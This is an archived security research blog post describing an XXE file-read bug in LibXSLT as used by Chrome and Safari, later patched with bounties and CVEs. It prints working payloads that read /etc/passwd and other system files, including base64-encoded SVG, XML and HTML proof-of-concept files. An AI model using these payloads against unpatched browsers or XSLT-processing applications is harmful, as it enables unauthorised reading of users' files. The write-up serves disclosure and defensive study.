---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-05-22_getting-xxe-in-web-browsers-using-chatgpt.md
original_filename: 2024-05-22_getting-xxe-in-web-browsers-using-chatgpt.md
title: Getting XXE in Web Browsers using ChatGPT
category: documents
detected_topics:
- mobile-security
- sso
- ssrf
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- mobile-security
- sso
- ssrf
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: cf244e576305964ea7e67636bae9d44cfc8c54256b5c7b6105f8524f0ff701f0
text_sha256: ed9d203a80df236ece68a6325c295394ec4b7a0d3e64c6b4d27163f77f295805
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# Getting XXE in Web Browsers using ChatGPT

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-05-22_getting-xxe-in-web-browsers-using-chatgpt.md
- Source Type: markdown
- Detected Topics: mobile-security, sso, ssrf, xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `cf244e576305964ea7e67636bae9d44cfc8c54256b5c7b6105f8524f0ff701f0`
- Text SHA256: `ed9d203a80df236ece68a6325c295394ec4b7a0d3e64c6b4d27163f77f295805`


## Content

---
title: "Getting XXE in Web Browsers using ChatGPT"
page_title: "Getting XXE in Web Browsers using ChatGPT – PT SWARM"
url: "https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/"
final_url: "https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/"
authors: ["Igor Sak-Sakovskiy (@Psych0tr1a)"]
programs: ["Apple (Safari)", "Google (Chrome)", "libxslt"]
bugs: ["XXE"]
bounty: "28,000"
publication_date: "2024-05-22"
added_date: "2024-06-05"
source: "pentester.land/writeups.json"
original_index: 282
---

# Getting XXE in Web Browsers using ChatGPT

Written by [Igor Sak-Sakovskiy](https://swarm.ptsecurity.com/author/igor-sak-sakovskiy/ "Posts by Igor Sak-Sakovskiy") on May 22, 2024

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/6b048d36-xxe-article.png)

## Author

![](https://swarm.ptsecurity.com/wp-content/uploads/2021/10/6e29e1c339b21716b6f0a8c9f38e4bb2-150x150.jpg)

[Igor Sak-Sakovskiy](https://swarm.ptsecurity.com/author/igor-sak-sakovskiy/ "Posts by Igor Sak-Sakovskiy")

Web Application Security Expert 

[Psych0tr1a](https://twitter.com/Psych0tr1a "Visit Igor Sak-Sakovskiy’s Twitter")

A year ago, I wondered what a malicious page with disabled JavaScript could do.

I knew that SVG, which is based on XML, and XML itself could be complex and allow file access. Is the Same Origin Policy (SOP) correctly implemented for all possible XML and SVG syntaxes? Is access through the file:// protocol properly handled?

Since I was too lazy to read the documentation, I started generating examples using ChatGPT.

## XSL

The technology I decided to test is XSL. It stands for eXtensible Stylesheet Language. It’s a specialized XML-based language that can be used within or outside of XML for modifying it or retrieving data.

In Chrome, XSL is supported and the library used is LibXSLT. It’s possible to verify this by using `system-property('xsl:vendor')` function, as shown in the following example.

system-properties.xml
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <?xml-stylesheet href="system-properties.xsl" type="text/xsl"?>  
  <root/>

system-properties.xsl
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
  <p>
  Version: <xsl:value-of select="system-property('xsl:version')" /> <br />
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" /> <br />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
  </p>
  </xsl:template>
  </xsl:stylesheet>

Here is the output of the system-properties.xml file, uploaded to the local web server and opened in Chrome:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/dcc6ab1b-libxslt-1.png)

The LibXSLT library, first released on September 23, 1999, is both longstanding and widely used. It is a default component in Chrome, Safari, PHP, PostgreSQL, Oracle Database, Python, and numerous others applications.

The first interesting XSL output from ChatGPT was a code with functionality that allows you to retrieve the location of the current document. While this is not a vulnerability, it could be useful in some scenarios.

get-location.xml
  
  
  <?xml-stylesheet href="get-location.xsl" type="text/xsl"?>  
  <!DOCTYPE test [  
  <!ENTITY ent SYSTEM "?" NDATA aaa>  
  ]>
  <test>
  <getLocation test="ent"/>
  </test>

get-location.xsl
  
  
  <xsl:stylesheet version="1.0"  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  
  >  
  <xsl:output method="html"/>  
  <xsl:template match="getLocation">  
  <input type="text" value="{unparsed-entity-uri(@test)}" />  
  </xsl:template>  
  </xsl:stylesheet>

Here is what you should see after uploading this code to your web server:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/24484c5c-libxslt-2.png)

All the magic happens within the `unparsed-entity-uri()` function. This function returns the full path of the “ent” entity, which is constructed using the relative path “?”.

## XSL and Remote Content

Almost all XML-based languages have functionality that can be used for loading or displaying remote files, similar to the functionality of the `<iframe>` tag in HTML.

I asked ChatGPT many times about XSL’s content loading features. The examples below are what ChatGPT suggested I use, and the code was fully obtained from it.

###### **XML External Entities**

Since XSL is XML-based, usage of XML External Entities should be the first option.
  
  
  <?xml version="1.0"?>
  <!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <test>&xxe;</test>

###### **XInclude**

XInclude is an XML add-on that’s described in a W3C Recommendation from November 15, 2006.
  
  
  <?xml version="1.0"?>
  <test xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
  </test>

###### **XS**L** ‘s <xsl:import> and <xsl:include> tags**

These tags can be used to load files as XSL stylesheets, according to ChatGPT.
  
  
  <?xml version="1.0" ?>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="file:///etc/passwd"/>
  <xsl:import href="file:///etc/passwd"/>
  </xsl:stylesheet>

###### **XSL’s document() function**

XSL’s document() function can be used for loading files as XML documents.
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <xsl:stylesheet  version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
  <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
  </xsl:stylesheet>

## XXE

Using an edited ChatGPT output, I crafted an XSL file that combined the `document()` function with XML External Entities in the argument’s file, utilizing the data protocol. Next, I inserted the content of the XSL file into an XML file, also using the data protocol.

When I opened my XML file via an HTTP URL from my mobile phone, I was shocked to see my iOS /etc/hosts file! Later, my friend Yaroslav Babin(a.k.a. [@yarbabin](https://twitter.com/yarbabin)) confirmed the same result on Android!

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/4206315f-ios.png) iOS + Safari

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/4a714d7f-android.png) Android + Chrome

Next, I started testing offline HTML to PDF tools, and it turned out that file reading works there as well, despite their built-in restrictions.

There was no chance that this wasn’t a vulnerability!

Here is a photo of my Smart TV, where the file reading works as well:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/128f01a2-smart-tv_2.png)

I compiled a table summarizing all my tests:

**Test Scenario**| **Accessible Files**  
---|---  
Android + Chrome| /etc/hosts  
iOS + Safari| /etc/group, /etc/hosts, /etc/passwd  
Windows + Chrome| –  
Ubuntu + Chrome| –  
PlayStation 4 + Chrome| –  
Samsung TV + Chrome| /etc/group, /etc/hosts, /etc/passwd  
  
The likely root cause of this discrepancy is the differences between sandboxes. Running Chrome on Windows or Linux with the `--no-sandbox` attribute allows reading arbitrary files as the current user.

## Other Tests

I have tested some applications that use LibXSLT and don’t have sandboxes.

**App**| **Result**  
---|---  
PHP| Applications that allow control over `XSLTProcessor::importStylesheet` data can be affected.  
XMLSEC| The `document()` function did not allow `http(s)://` and `data:` URLs.  
Oracle| The `document()` function did not allow `http(s)://` and `data:` URLs.  
PostgreSQL| The `document()` function did not allow `http(s)://` and `data:` URLs.  
  
The default PHP configuration disables parsing of external entities XML and XSL documents. However, this does not affect XML documents loaded by the `document()` function, and PHP allows the reading of arbitrary files using LibXSLT.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/32ddd52d-Screenshot-from-2024-05-22-03-17-00.png)

According to my tests, calling `libxml_set_external_entity_loader(function ($a) {});` is sufficient to prevent the attack.

## POCs

You will find all the POCs in a ZIP archive at the end of this section. Note that these are not zero-day POCs; details on reporting to the vendor and bounty information will be also provided later.

First, I created a simple HTML page with multiple `<iframe>` elements to test all possible file read functionalities and all possible ways to chain them:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/2f4cfb4c-first-poc.png)The result of opening the xxe_all_tests/test.html page in an outdated Chrome

Open this page in Chrome, Safari, or Electron-like apps. It may read system files with default sandbox settings; without the sandbox, it may read arbitrary files with the current user’s rights.

As you can see now, only one of the call chains leads to an XXE in Chrome, and we were very fortunate to find it. Here is my schematic of the chain for better understanding:

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/45e1329a-Screenshot-from-2024-05-22-16-25-01.png)

Next, I created minified XML, SVG, and HTML POCs that you can copy directly from the article.

poc.svg
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <?xml-stylesheet type="text/xsl" href="data:text/xml;base64,PHhzbDpzdHlsZXNoZWV0IHZlcnNpb249IjEuMCIgeG1sbnM6eHNsPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIHhtbG5zOnVzZXI9Imh0dHA6Ly9teWNvbXBhbnkuY29tL215bmFtZXNwYWNlIj4KPHhzbDpvdXRwdXQgbWV0aG9kPSJ4bWwiLz4KPHhzbDp0ZW1wbGF0ZSBtYXRjaD0iLyI+CjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGZvcmVpZ25PYmplY3Qgd2lkdGg9IjMwMCIgaGVpZ2h0PSI2MDAiPgo8ZGl2IHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4KTGlicmFyeTogPHhzbDp2YWx1ZS1vZiBzZWxlY3Q9InN5c3RlbS1wcm9wZXJ0eSgneHNsOnZlbmRvcicpIiAvPjx4c2w6dmFsdWUtb2Ygc2VsZWN0PSJzeXN0ZW0tcHJvcGVydHkoJ3hzbDp2ZXJzaW9uJykiIC8+PGJyIC8+IApMb2NhdGlvbjogPHhzbDp2YWx1ZS1vZiBzZWxlY3Q9InVucGFyc2VkLWVudGl0eS11cmkoLyovQGxvY2F0aW9uKSIgLz4gIDxici8+ClhTTCBkb2N1bWVudCgpIFhYRTogCjx4c2w6Y29weS1vZiAgc2VsZWN0PSJkb2N1bWVudCgnZGF0YTosJTNDJTNGeG1sJTIwdmVyc2lvbiUzRCUyMjEuMCUyMiUyMGVuY29kaW5nJTNEJTIyVVRGLTglMjIlM0YlM0UlMEElM0MlMjFET0NUWVBFJTIweHhlJTIwJTVCJTIwJTNDJTIxRU5USVRZJTIweHhlJTIwU1lTVEVNJTIwJTIyZmlsZTovLy9ldGMvcGFzc3dkJTIyJTNFJTIwJTVEJTNFJTBBJTNDeHhlJTNFJTBBJTI2eHhlJTNCJTBBJTNDJTJGeHhlJTNFJykiLz4KPC9kaXY+CjwvZm9yZWlnbk9iamVjdD4KPC9zdmc+CjwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg=="?>
  <!DOCTYPE svg [  
  <!ENTITY ent SYSTEM "?" NDATA aaa>  
  ]>
  <svg location="ent" />

poc.xml
  
  
  <?xml version="1.0" encoding="UTF-8"?>
  <?xml-stylesheet type="text/xsl" href="data:text/xml;base64,PHhzbDpzdHlsZXNoZWV0IHZlcnNpb249IjEuMCIgeG1sbnM6eHNsPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L1hTTC9UcmFuc2Zvcm0iIHhtbG5zOnVzZXI9Imh0dHA6Ly9teWNvbXBhbnkuY29tL215bmFtZXNwYWNlIj4KPHhzbDpvdXRwdXQgdHlwZT0iaHRtbCIvPgo8eHNsOnRlbXBsYXRlIG1hdGNoPSJ0ZXN0MSI+CjxodG1sPgpMaWJyYXJ5OiA8eHNsOnZhbHVlLW9mIHNlbGVjdD0ic3lzdGVtLXByb3BlcnR5KCd4c2w6dmVuZG9yJykiIC8+PHhzbDp2YWx1ZS1vZiBzZWxlY3Q9InN5c3RlbS1wcm9wZXJ0eSgneHNsOnZlcnNpb24nKSIgLz48YnIgLz4gCkxvY2F0aW9uOiA8eHNsOnZhbHVlLW9mIHNlbGVjdD0idW5wYXJzZWQtZW50aXR5LXVyaShAbG9jYXRpb24pIiAvPiAgPGJyLz4KWFNMIGRvY3VtZW50KCkgWFhFOiAKPHhzbDpjb3B5LW9mICBzZWxlY3Q9ImRvY3VtZW50KCdkYXRhOiwlM0MlM0Z4bWwlMjB2ZXJzaW9uJTNEJTIyMS4wJTIyJTIwZW5jb2RpbmclM0QlMjJVVEYtOCUyMiUzRiUzRSUwQSUzQyUyMURPQ1RZUEUlMjB4eGUlMjAlNUIlMjAlM0MlMjFFTlRJVFklMjB4eGUlMjBTWVNURU0lMjAlMjJmaWxlOi8vL2V0Yy9wYXNzd2QlMjIlM0UlMjAlNUQlM0UlMEElM0N4eGUlM0UlMEElMjZ4eGUlM0IlMEElM0MlMkZ4eGUlM0UnKSIvPgo8L2h0bWw+CjwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg=="?>
  <!DOCTYPE test [  
  <!ENTITY ent SYSTEM "?" NDATA aaa>  
  ]>
  <test1 location="ent"/>

poc.html
  
  
  <html>
  <head>
  <title>LibXSLT document() XXE tests</title>
  </head>
  <body>
  SVG<br/>
  <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPD94bWwtc3R5bGVzaGVldCB0eXBlPSJ0ZXh0L3hzbCIgaHJlZj0iZGF0YTp0ZXh0L3htbDtiYXNlNjQsUEhoemJEcHpkSGxzWlhOb1pXVjBJSFpsY25OcGIyNDlJakV1TUNJZ2VHMXNibk02ZUhOc1BTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1TDFoVFRDOVVjbUZ1YzJadmNtMGlJSGh0Ykc1ek9uVnpaWEk5SW1oMGRIQTZMeTl0ZVdOdmJYQmhibmt1WTI5dEwyMTVibUZ0WlhOd1lXTmxJajRLUEhoemJEcHZkWFJ3ZFhRZ2JXVjBhRzlrUFNKNGJXd2lMejRLUEhoemJEcDBaVzF3YkdGMFpTQnRZWFJqYUQwaUx5SStDanh6ZG1jZ2VHMXNibk05SW1oMGRIQTZMeTkzZDNjdWR6TXViM0puTHpJd01EQXZjM1puSWo0S1BHWnZjbVZwWjI1UFltcGxZM1FnZDJsa2RHZzlJak13TUNJZ2FHVnBaMmgwUFNJMk1EQWlQZ284WkdsMklIaHRiRzV6UFNKb2RIUndPaTh2ZDNkM0xuY3pMbTl5Wnk4eE9UazVMM2hvZEcxc0lqNEtUR2xpY21GeWVUb2dQSGh6YkRwMllXeDFaUzF2WmlCelpXeGxZM1E5SW5ONWMzUmxiUzF3Y205d1pYSjBlU2duZUhOc09uWmxibVJ2Y2ljcElpQXZQang0YzJ3NmRtRnNkV1V0YjJZZ2MyVnNaV04wUFNKemVYTjBaVzB0Y0hKdmNHVnlkSGtvSjNoemJEcDJaWEp6YVc5dUp5a2lJQzgrUEdKeUlDOCtJQXBNYjJOaGRHbHZiam9nUEhoemJEcDJZV3gxWlMxdlppQnpaV3hsWTNROUluVnVjR0Z5YzJWa0xXVnVkR2wwZVMxMWNta29MeW92UUd4dlkyRjBhVzl1S1NJZ0x6NGdJRHhpY2k4K0NsaFRUQ0JrYjJOMWJXVnVkQ2dwSUZoWVJUb2dDang0YzJ3NlkyOXdlUzF2WmlBZ2MyVnNaV04wUFNKa2IyTjFiV1Z1ZENnblpHRjBZVG9zSlROREpUTkdlRzFzSlRJd2RtVnljMmx2YmlVelJDVXlNakV1TUNVeU1pVXlNR1Z1WTI5a2FXNW5KVE5FSlRJeVZWUkdMVGdsTWpJbE0wWWxNMFVsTUVFbE0wTWxNakZFVDBOVVdWQkZKVEl3ZUhobEpUSXdKVFZDSlRJd0pUTkRKVEl4UlU1VVNWUlpKVEl3ZUhobEpUSXdVMWxUVkVWTkpUSXdKVEl5Wm1sc1pUb3ZMeTlsZEdNdmNHRnpjM2RrSlRJeUpUTkZKVEl3SlRWRUpUTkZKVEJCSlRORGVIaGxKVE5GSlRCQkpUSTJlSGhsSlROQ0pUQkJKVE5ESlRKR2VIaGxKVE5GSnlraUx6NEtQQzlrYVhZK0Nqd3ZabTl5WldsbmJrOWlhbVZqZEQ0S1BDOXpkbWMrQ2p3dmVITnNPblJsYlhCc1lYUmxQZ284TDNoemJEcHpkSGxzWlhOb1pXVjBQZz09Ij8+CjwhRE9DVFlQRSBzdmcgWyAgCiAgICA8IUVOVElUWSBlbnQgU1lTVEVNICI/IiBOREFUQSBhYWE+ICAgCl0+CjxzdmcgbG9jYXRpb249ImVudCIgLz4="></iframe><br/>
  SVG WIN<br/>
  <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPD94bWwtc3R5bGVzaGVldCB0eXBlPSJ0ZXh0L3hzbCIgaHJlZj0iZGF0YTp0ZXh0L3htbDtiYXNlNjQsUEhoemJEcHpkSGxzWlhOb1pXVjBJSFpsY25OcGIyNDlJakV1TUNJZ2VHMXNibk02ZUhOc1BTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1TDFoVFRDOVVjbUZ1YzJadmNtMGlJSGh0Ykc1ek9uVnpaWEk5SW1oMGRIQTZMeTl0ZVdOdmJYQmhibmt1WTI5dEwyMTVibUZ0WlhOd1lXTmxJajRLUEhoemJEcHZkWFJ3ZFhRZ2JXVjBhRzlrUFNKNGJXd2lMejRLUEhoemJEcDBaVzF3YkdGMFpTQnRZWFJqYUQwaUx5SStDanh6ZG1jZ2VHMXNibk05SW1oMGRIQTZMeTkzZDNjdWR6TXViM0puTHpJd01EQXZjM1puSWo0S1BHWnZjbVZwWjI1UFltcGxZM1FnZDJsa2RHZzlJak13TUNJZ2FHVnBaMmgwUFNJMk1EQWlQZ284WkdsMklIaHRiRzV6UFNKb2RIUndPaTh2ZDNkM0xuY3pMbTl5Wnk4eE9UazVMM2hvZEcxc0lqNEtUR2xpY21GeWVUb2dQSGh6YkRwMllXeDFaUzF2WmlCelpXeGxZM1E5SW5ONWMzUmxiUzF3Y205d1pYSjBlU2duZUhOc09uWmxibVJ2Y2ljcElpQXZQang0YzJ3NmRtRnNkV1V0YjJZZ2MyVnNaV04wUFNKemVYTjBaVzB0Y0hKdmNHVnlkSGtvSjNoemJEcDJaWEp6YVc5dUp5a2lJQzgrUEdKeUlDOCtJQXBNYjJOaGRHbHZiam9nUEhoemJEcDJZV3gxWlMxdlppQnpaV3hsWTNROUluVnVjR0Z5YzJWa0xXVnVkR2wwZVMxMWNta29MeW92UUd4dlkyRjBhVzl1S1NJZ0x6NGdJRHhpY2k4K0NsaFRUQ0JrYjJOMWJXVnVkQ2dwSUZoWVJUb2dDang0YzJ3NlkyOXdlUzF2WmlBZ2MyVnNaV04wUFNKa2IyTjFiV1Z1ZENnblpHRjBZVG9zSlROREpUTkdlRzFzSlRJd2RtVnljMmx2YmlVelJDVXlNakV1TUNVeU1pVXlNR1Z1WTI5a2FXNW5KVE5FSlRJeVZWUkdMVGdsTWpJbE0wWWxNMFVsTUVFbE0wTWxNakZFVDBOVVdWQkZKVEl3ZUhobEpUSXdKVFZDSlRJd0pUTkRKVEl4UlU1VVNWUlpKVEl3ZUhobEpUSXdVMWxUVkVWTkpUSXdKVEl5Wm1sc1pUb3ZMeTlqT2k5M2FXNWtiM2R6TDNONWMzUmxiUzVwYm1rbE1qSWxNMFVsTWpBbE5VUWxNMFVsTUVFbE0wTjRlR1VsTTBVbE1FRWxNalo0ZUdVbE0wSWxNRUVsTTBNbE1rWjRlR1VsTTBVbktTSXZQZ284TDJScGRqNEtQQzltYjNKbGFXZHVUMkpxWldOMFBnbzhMM04yWno0S1BDOTRjMnc2ZEdWdGNHeGhkR1UrQ2p3dmVITnNPbk4wZVd4bGMyaGxaWFErIj8+CjwhRE9DVFlQRSB0ZXN0MSBbICAKICAgIDwhRU5USVRZIGVudCBTWVNURU0gIj8iIE5EQVRBIGFhYT4gICAKXT4KPHRlc3QxIGxvY2F0aW9uPSJlbnQiIC8+"></iframe><br/>
  XML<br/>
  <iframe src="data:text/xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPD94bWwtc3R5bGVzaGVldCB0eXBlPSJ0ZXh0L3hzbCIgaHJlZj0iZGF0YTp0ZXh0L3htbDtiYXNlNjQsUEhoemJEcHpkSGxzWlhOb1pXVjBJSFpsY25OcGIyNDlJakV1TUNJZ2VHMXNibk02ZUhOc1BTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1TDFoVFRDOVVjbUZ1YzJadmNtMGlJSGh0Ykc1ek9uVnpaWEk5SW1oMGRIQTZMeTl0ZVdOdmJYQmhibmt1WTI5dEwyMTVibUZ0WlhOd1lXTmxJajRLUEhoemJEcHZkWFJ3ZFhRZ2RIbHdaVDBpYUhSdGJDSXZQZ284ZUhOc09uUmxiWEJzWVhSbElHMWhkR05vUFNKMFpYTjBNU0krQ2p4b2RHMXNQZ3BNYVdKeVlYSjVPaUE4ZUhOc09uWmhiSFZsTFc5bUlITmxiR1ZqZEQwaWMzbHpkR1Z0TFhCeWIzQmxjblI1S0NkNGMydzZkbVZ1Wkc5eUp5a2lJQzgrUEhoemJEcDJZV3gxWlMxdlppQnpaV3hsWTNROUluTjVjM1JsYlMxd2NtOXdaWEowZVNnbmVITnNPblpsY25OcGIyNG5LU0lnTHo0OFluSWdMejRnQ2t4dlkyRjBhVzl1T2lBOGVITnNPblpoYkhWbExXOW1JSE5sYkdWamREMGlkVzV3WVhKelpXUXRaVzUwYVhSNUxYVnlhU2hBYkc5allYUnBiMjRwSWlBdlBpQWdQR0p5THo0S1dGTk1JR1J2WTNWdFpXNTBLQ2tnV0ZoRk9pQUtQSGh6YkRwamIzQjVMVzltSUNCelpXeGxZM1E5SW1SdlkzVnRaVzUwS0Nka1lYUmhPaXdsTTBNbE0wWjRiV3dsTWpCMlpYSnphVzl1SlRORUpUSXlNUzR3SlRJeUpUSXdaVzVqYjJScGJtY2xNMFFsTWpKVlZFWXRPQ1V5TWlVelJpVXpSU1V3UVNVelF5VXlNVVJQUTFSWlVFVWxNakI0ZUdVbE1qQWxOVUlsTWpBbE0wTWxNakZGVGxSSlZGa2xNakI0ZUdVbE1qQlRXVk5VUlUwbE1qQWxNakptYVd4bE9pOHZMMlYwWXk5d1lYTnpkMlFsTWpJbE0wVWxNakFsTlVRbE0wVWxNRUVsTTBONGVHVWxNMFVsTUVFbE1qWjRlR1VsTTBJbE1FRWxNME1sTWtaNGVHVWxNMFVuS1NJdlBnbzhMMmgwYld3K0Nqd3ZlSE5zT25SbGJYQnNZWFJsUGdvOEwzaHpiRHB6ZEhsc1pYTm9aV1YwUGc9PSI/Pgo8IURPQ1RZUEUgdGVzdCBbICAKICAgIDwhRU5USVRZIGVudCBTWVNURU0gIj8iIE5EQVRBIGFhYT4gICAKXT4KPHRlc3QxIGxvY2F0aW9uPSJlbnQiLz4="></iframe><br/>
  XML WIN<br/>
  <iframe src="data:text/xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPD94bWwtc3R5bGVzaGVldCB0eXBlPSJ0ZXh0L3hzbCIgaHJlZj0iZGF0YTp0ZXh0L3htbDtiYXNlNjQsUEhoemJEcHpkSGxzWlhOb1pXVjBJSFpsY25OcGIyNDlJakV1TUNJZ2VHMXNibk02ZUhOc1BTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1TDFoVFRDOVVjbUZ1YzJadmNtMGlJSGh0Ykc1ek9uVnpaWEk5SW1oMGRIQTZMeTl0ZVdOdmJYQmhibmt1WTI5dEwyMTVibUZ0WlhOd1lXTmxJajRLUEhoemJEcHZkWFJ3ZFhRZ2RIbHdaVDBpYUhSdGJDSXZQZ284ZUhOc09uUmxiWEJzWVhSbElHMWhkR05vUFNKMFpYTjBNU0krQ2p4b2RHMXNQZ3BNYVdKeVlYSjVPaUE4ZUhOc09uWmhiSFZsTFc5bUlITmxiR1ZqZEQwaWMzbHpkR1Z0TFhCeWIzQmxjblI1S0NkNGMydzZkbVZ1Wkc5eUp5a2lJQzgrSmlONE1qQTdQSGh6YkRwMllXeDFaUzF2WmlCelpXeGxZM1E5SW5ONWMzUmxiUzF3Y205d1pYSjBlU2duZUhOc09uWmxjbk5wYjI0bktTSWdMejQ4WW5JZ0x6NGdDa3h2WTJGMGFXOXVPaUE4ZUhOc09uWmhiSFZsTFc5bUlITmxiR1ZqZEQwaWRXNXdZWEp6WldRdFpXNTBhWFI1TFhWeWFTaEFiRzlqWVhScGIyNHBJaUF2UGlBZ1BHSnlMejRLV0ZOTUlHUnZZM1Z0Ym1WMEtDa2dXRmhGT2lBS1BIaHpiRHBqYjNCNUxXOW1JQ0J6Wld4bFkzUTlJbVJ2WTNWdFpXNTBLQ2RrWVhSaE9pd2xNME1sTTBaNGJXd2xNakIyWlhKemFXOXVKVE5FSlRJeU1TNHdKVEl5SlRJd1pXNWpiMlJwYm1jbE0wUWxNakpWVkVZdE9DVXlNaVV6UmlVelJTVXdRU1V6UXlVeU1VUlBRMVJaVUVVbE1qQjRlR1VsTWpBbE5VSWxNakFsTTBNbE1qRkZUbFJKVkZrbE1qQjRlR1VsTWpCVFdWTlVSVTBsTWpBbE1qSm1hV3hsT2k4dkwyTTZMM2RwYm1SdmQzTXZjM2x6ZEdWdExtbHVhU1V5TWlVelJTVXlNQ1UxUkNVelJTVXdRU1V6UTNoNFpTVXpSU1V3UVNVeU5uaDRaU1V6UWlVd1FTVXpReVV5Um5oNFpTVXpSU2NwSWk4K0Nqd3ZhSFJ0YkQ0S1BDOTRjMnc2ZEdWdGNHeGhkR1UrQ2p3dmVITnNPbk4wZVd4bGMyaGxaWFErIj8+CjwhRE9DVFlQRSB0ZXN0IFsgIAogICAgPCFFTlRJVFkgZW50IFNZU1RFTSAiPyIgTkRBVEEgYWFhPiAgIApdPgo8dGVzdDEgbG9jYXRpb249ImVudCIvPg=="></iframe><br/>
  </body>

ZIP archive for testing: [libxslt.zip](/wp-content/uploads/2024/05/d34e0a53-libxslt.zip).

## The Bounty

All findings were immediately reported to the vendors.

![](https://swarm.ptsecurity.com/wp-content/uploads/2024/05/1d340d89-bounty-2500.png)

###### **Safari**

Apple implemented the sandbox patch. Assigned CVE: CVE-2023-40415. Reward: $25,000. 💰

###### **Chrome**

Google implemented the patch and enforced security for documents loaded by the XSL’s `document()` function. Assigned CVE: CVE-2023-4357. Reward: $3,000. 💸

## Links

  * <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-40415>
  * <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4357>
  * <https://issues.chromium.org/issues/40066577>

Feel free to write your thoughts about the article [on our X page](https://twitter.com/ptswarm). Follow [@ptswarm](https://twitter.com/ptswarm) so you don’t miss our future research and other publications.

[Arbitrary File Read](https://swarm.ptsecurity.com/tag/arbitrary-file-read/), [SSRF](https://swarm.ptsecurity.com/tag/ssrf/), [Web Application Security](https://swarm.ptsecurity.com/tag/web-application-security/), [XXE](https://swarm.ptsecurity.com/tag/xxe/)
